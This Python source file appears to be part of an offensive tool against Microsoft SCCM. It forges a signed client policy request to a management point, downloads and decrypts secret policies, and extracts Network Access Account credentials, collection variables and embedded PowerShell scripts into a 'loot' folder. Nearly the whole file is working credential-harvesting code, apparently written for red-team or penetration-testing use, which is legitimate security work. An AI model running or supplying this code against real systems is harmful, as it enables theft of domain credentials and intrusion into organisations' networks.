import os
import json
import zlib
import base64
import logging
import requests
import binascii
import xml.etree.ElementTree                        as ET

from datetime                                       import datetime
from requests_toolbelt.multipart                    import decoder
from utils.miscUtils                                import encodeUTF16StripBOM, cleanJunkInXML
from utils.cryptoUtils                              import buildMSPublicKeyBlob, SCCMSign
from utils.requestTemplates                         import policyRequestTemplate, policyRequestHeaderTemplate
from pyasn1_modules                                 import rfc5652
from pyasn1.codec.der.decoder                       import decode
from cryptography.hazmat.primitives                 import serialization
from cryptography.hazmat.primitives.asymmetric      import padding
from cryptography.hazmat.primitives.hashes          import SHA1
from cryptography.hazmat.primitives.ciphers         import Cipher, algorithms, modes
from cryptography.hazmat.backends                   import default_backend
from utils.deobfuscateSecretPolicyBlob              import deobfuscateSecretPolicyBlob


from conf                                           import DATE_FORMAT, OID_MAPPING, bcolors

logger = logging.getLogger(__name__)

def generatePoliciesRequestPayload(management_point, private_key, client_guid, client_name):
    policyRequest = encodeUTF16StripBOM(policyRequestTemplate.format(
        clientid=client_guid,
        clientfqdn=client_name,
        client=client_name.split('.')[0]
    )) + b"\x00\x00\r\n"
    policyRequestCompressed = zlib.compress(policyRequest)

    MSPublicKey = buildMSPublicKeyBlob(private_key)
    clientID = f"GUID:{client_guid.upper()}"
    clientIDSignature = SCCMSign(private_key, encodeUTF16StripBOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
    policyRequestSignature = SCCMSign(private_key, policyRequestCompressed).hex().upper()

    policyRequestHeader = policyRequestHeaderTemplate.format(
        bodylength=len(policyRequest)-2, 
        sccmserver=management_point, 
        client=client_name.split('.')[0],
        publickey=MSPublicKey, 
        clientIDsignature=clientIDSignature, 
        payloadsignature=policyRequestSignature, 
        clientid=client_guid, 
        date=datetime.now().strftime(DATE_FORMAT)
    )

    final_body = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii')
    final_body += policyRequestHeader.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii')
    final_body += policyRequestCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

    return final_body




def requestPolicies(management_point, policies_request_payload):
    headers = {
        "Connection": "close",
        "User-Agent": "ConfigMgr Messaging HTTP Sender",
        "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
    }

    r = requests.request("CCM_POST", f"{management_point}/ccm_system/request", headers=headers, data=policies_request_payload)
    multipart_data = decoder.MultipartDecoder.from_response(r)
    for part in multipart_data.parts:
        if part.headers[b'content-type'] == b'application/octet-stream':
            return zlib.decompress(part.content).decode('utf-16')


def requestPolicy(policy_url, client_guid, requiresauth=False, private_key=None):
    headers = {
        "Connection": "close",
        "User-Agent": "ConfigMgr Messaging HTTP Sender"
    }

    if requiresauth == True:
        headers["ClientToken"] = f"GUID:{client_guid};{datetime.now().strftime(DATE_FORMAT)};2"
        headers["ClientTokenSignature"] = SCCMSign(private_key, f"GUID:{client_guid};{datetime.now().strftime(DATE_FORMAT)};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()

    r = requests.get(policy_url, headers=headers)
    return r.content

def decryptKeyOAEP(encrypted_key, private_key):
    return private_key.decrypt(encrypted_key, padding.OAEP(mgf=padding.MGF1(algorithm=SHA1()), algorithm=SHA1(), label=None))

def decryptKeyRSA(encrypted_key, private_key):
    return private_key.decrypt(encrypted_key, padding.PKCS1v15())

def decryptBodyTripleDES(body, plaintextkey, iv):
    cipher = Cipher(algorithms.TripleDES(plaintextkey), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(body) + decryptor.finalize()
    return plaintext.decode('utf-16le')

def decryptBodyAESCBC(body, plaintextkey, iv):
    cipher = Cipher(algorithms.AES(plaintextkey), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(body) + decryptor.finalize()
    return plaintext.decode('utf-16le')

def decryptSecretPolicy(policy_response, private_key):
    content, rest = decode(policy_response, asn1Spec=rfc5652.ContentInfo())
    content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
    encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
    keyEncryptionOID = str(content['recipientInfos'][0]['ktri']['keyEncryptionAlgorithm']['algorithm'])
    iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
    body = content['encryptedContentInfo']['encryptedContent'].asOctets()
    bodyEncryptionOID = str(content['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])

    try:
        if OID_MAPPING[keyEncryptionOID] == 'rsaEncryption':
            plaintextkey = decryptKeyRSA(encryptedRSAKey, private_key)
        elif OID_MAPPING[keyEncryptionOID] == 'id-RSAES-OAEP':
            plaintextkey = decryptKeyOAEP(encryptedRSAKey, private_key)
        else:
            logger.error(f"{bcolors.FAIL}[-] Key decryption algorithm {OID_MAPPING[keyEncryptionOID]} is not currently implemented.{bcolors.ENDC}")
            return
    except KeyError as e:
        logger.error(f"{bcolors.FAIL}[-] Unknown key decryption algorithm.{bcolors.ENDC}")
        return

    try:
        if OID_MAPPING[bodyEncryptionOID] == 'des-ede3-cbc':
            plaintextbody = decryptBodyTripleDES(body, plaintextkey, iv)
        elif OID_MAPPING[bodyEncryptionOID] == 'aes256_cbc':
            plaintextbody = decryptBodyAESCBC(body, plaintextkey, iv)
        else:
            logger.error(f"{bcolors.FAIL}[-] Body decryption algorithm {OID_MAPPING[bodyEncryptionOID]} is not currently implemented.{bcolors.ENDC}")
            return
    except KeyError as e:
        logger.error(f"{bcolors.FAIL}[-] Unknown body decryption algorithm.{bcolors.ENDC}")
        return

    return plaintextbody



def parsePoliciesFlags(policyFlagValue):
    policyFlagValue = int(policyFlagValue)
    NONE                        = 0b0000000
    TASKSEQUENCE                = 0b0000001
    REQUIRESAUTH                = 0b0000010
    SECRET                      = 0b0000100
    INTRANETONLY                = 0b0001000
    PERSISTWHOLEPOLICY          = 0b0010000
    AUTHORIZEDDYNAMICDOWNLOAD   = 0b0100000
    COMPRESSED                  = 0b1000000 

    result = []
    if policyFlagValue & TASKSEQUENCE != 0:
        result.append("TASKSEQUENCE")
    if policyFlagValue & REQUIRESAUTH != 0:
        result.append("REQUIRESAUTH")
    if policyFlagValue & SECRET != 0:
        result.append("SECRET")
    if policyFlagValue & INTRANETONLY != 0:
        result.append("INTRANETONLY")
    if policyFlagValue & PERSISTWHOLEPOLICY != 0:
        result.append("PERSISTWHOLEPOLICY")
    if policyFlagValue & AUTHORIZEDDYNAMICDOWNLOAD != 0:
        result.append("AUTHORIZEDDYNAMICDOWNLOAD")
    if policyFlagValue & COMPRESSED != 0:
        result.append("COMPRESSED")
    
    return result



def policiesRequest(management_point, private_key, client_guid, client_name, directory_name):
    logger.warning(f"{bcolors.OKCYAN}\n[*] Requesting device policies {client_name}{bcolors.ENDC}")
    policies_request_payload = generatePoliciesRequestPayload(management_point, private_key, client_guid, client_name)
    policies_response = requestPolicies(management_point, policies_request_payload)
    
    root = ET.fromstring(policies_response[:-1])
    policies = root.findall(".//Policy")
    policies_json = {}
    for policy in policies:
        policies_json[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "N/A",
                                        "PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "N/A",
                                        "PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "N/A",
                                        "PolicyFlags": parsePoliciesFlags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
                                        "PolicyLocation": policy[0].text.replace("<mp>", management_point.split('http://')[1]) }
  
    os.makedirs(f'loot/{directory_name}/policies/')
    with open(f'loot/{directory_name}/policies/policies.json', 'w') as f:
        f.write(json.dumps(policies_json))
    with open(f'loot/{directory_name}/policies/policies.raw', 'w') as f:
        f.write(policies_response)

    secret_policies = {}
    for key, value in policies_json.items():
        if isinstance(value["PolicyFlags"], list) and "SECRET" in value["PolicyFlags"]:
            secret_policies[key] = value

    logger.warning(f"{bcolors.OKGREEN}[+] Policies list retrieved ({len(policies_json.keys())} total policies ; {bcolors.BOLD}{len(secret_policies.keys())} secret policies{bcolors.ENDC}){bcolors.ENDC}")
    return secret_policies



def secretPolicyProcess(policyID, policy, private_key, client_guid, directory_name):
    logger.info(f"[INFO] Dumping secret policy {policyID}")
    os.makedirs(f'loot/{directory_name}/policies/{policyID}')

    NAA_credentials = {"NetworkAccessUsername": None, "NetworkAccessPassword": None}
    policy_response = requestPolicy(policy["PolicyLocation"], client_guid, requiresauth=True, private_key=private_key)
    decrypted = decryptSecretPolicy(policy_response, private_key)[:-1]
    decrypted = cleanJunkInXML(decrypted)
    
    if policy["PolicyCategory"] == "CollectionSettings":
        logger.info("[INFO] Processing a CollectionSettings policy to extract collection variables")
        root = ET.fromstring(decrypted)
        binary_data = binascii.unhexlify(root.text)
        decompressed_data = zlib.decompress(binary_data)
        decrypted = decompressed_data.decode('utf16')

    with open(f'loot/{directory_name}/policies/{policyID}/policy.txt', 'w') as f:
        f.write(decrypted)
    
    
    known_packages = []
    root = ET.fromstring(decrypted)

    blobs_set = {}

    if policy["PolicyCategory"] == "CollectionSettings":
        for instance in root.findall(".//instance"):
            name = None
            value = None
            for prop in instance.findall('property'):
                prop_name = prop.get('name')
                if prop_name == 'Name':
                    name = prop.find('value').text.strip()
                elif prop_name == 'Value':
                    value = prop.find('value').text.strip()
            blobs_set[name] = value

    else:
        obfuscated_blobs = root.findall('.//*[@secret="1"]')    
        for obfuscated_blob in obfuscated_blobs:       
            blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text
    
    logger.warning(f"[*] Found {bcolors.BOLD}{len(blobs_set.keys())}{bcolors.ENDC} obfuscated blob(s) in secret policy.")
    for i, blob_name in enumerate(blobs_set.keys()):
        data = deobfuscateSecretPolicyBlob(blobs_set[blob_name])
        filename = f'loot/{directory_name}/policies/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
        with open(filename, 'w') as f:
            f.write(f"Secret property name: {blob_name}\n\n")
            f.write(data + "\n")
        if blob_name == "NetworkAccessUsername":
            NAA_credentials["NetworkAccessUsername"] = data
        if blob_name == "NetworkAccessPassword":
            NAA_credentials["NetworkAccessPassword"] = data

        logger.info(f"[INFO] Deobfuscated blob n°{i+1}")
        try:
            blobroot = ET.fromstring(cleanJunkInXML(data))
            source_scripts = blobroot.findall('.//*[@property="SourceScript"]')
            if len(source_scripts) > 0:
                logger.warning(f"[*] Found {bcolors.BOLD}{len(source_scripts)} embedded powershell scripts in blob.{bcolors.ENDC}")
                for j, script in enumerate(source_scripts):
                    decoded_script = base64.b64decode(script.text).decode('utf-16le')
                    with open(f'loot/{directory_name}/policies/{policyID}/secretBlob_{str(i+1)}-{blob_name}_embeddedScript_{j+1}.txt', 'w') as f:
                        f.write(decoded_script)
                        f.write("\n")
            for elem in blobroot.findall(".//referenceList/reference"):
                if elem.get("package"):
                    logger.info(f"[INFO] Found a package ID in secret policy: {elem.get('package')}")
                    known_packages.append(elem.get("package"))

        except ET.ParseError as e:
            logger.info("[INFO] Failed parsing XML on this blob - not XML content")
            pass
    logger.warning(f"{bcolors.OKGREEN}[+] Secret policy {policyID} processed.{bcolors.ENDC}")
    
    if NAA_credentials["NetworkAccessUsername"] is not None:
        return {"NAA_credentials": NAA_credentials, "known_packages": known_packages}
    else:
        return {"NAA_credentials": None, "known_packages": known_packages}
